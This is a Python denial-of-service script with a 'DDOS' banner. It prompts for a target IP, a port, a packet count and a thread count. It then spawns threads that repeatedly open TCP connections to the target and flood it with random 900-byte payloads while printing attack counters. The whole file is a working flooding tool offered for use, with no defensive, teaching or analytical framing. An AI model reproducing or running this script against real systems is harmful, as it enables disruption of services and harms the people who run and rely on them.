#!usr/bin/python3
import os,sys, time,socket,threading, random

#     Banner     #
def banner():
	print()
	print(".########..########...#######...######.")
	print(".##.....##.##.....##.##.....##.##....##")
	print(".##.....##.##.....##.##.....##.##......")
	print(".##.....##.##.....##.##.....##..######.")
	print(".##.....##.##.....##.##.....##.......##")
	print(".##.....##.##.....##.##.....##.##....##")
	print(".########..########...#######...######.")
	print()
	print(f"#######################################")
banner()
ip = str(input("[$]> Target : "))
port = int(input("[$]> Post : "))
packet = int(input("[$]> Packet : "))
thread = int(input("[$]> Thread : "))
time.sleep(1.5)
print(f"#######################################")
print(f"[#] Attacking {ip} . . .")

def attack():
	hevin = random._urandom(900)
	bb = int(0)
	while True:
		try:
			h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			h.connect((ip,port))
			h.send(hevin)
			for i in range(packet):
				h.send(hevin)
			bb += 1
			print(f"[+] Attack >> {ip} | "+str(bb))
		except KeyboardInterrupt:
			h.close()
			print(f"[-] Attack >> {ip} | Done")
			pass

for b in range(thread):
	thread = threading.Thread(target=attack)
	thread.start()
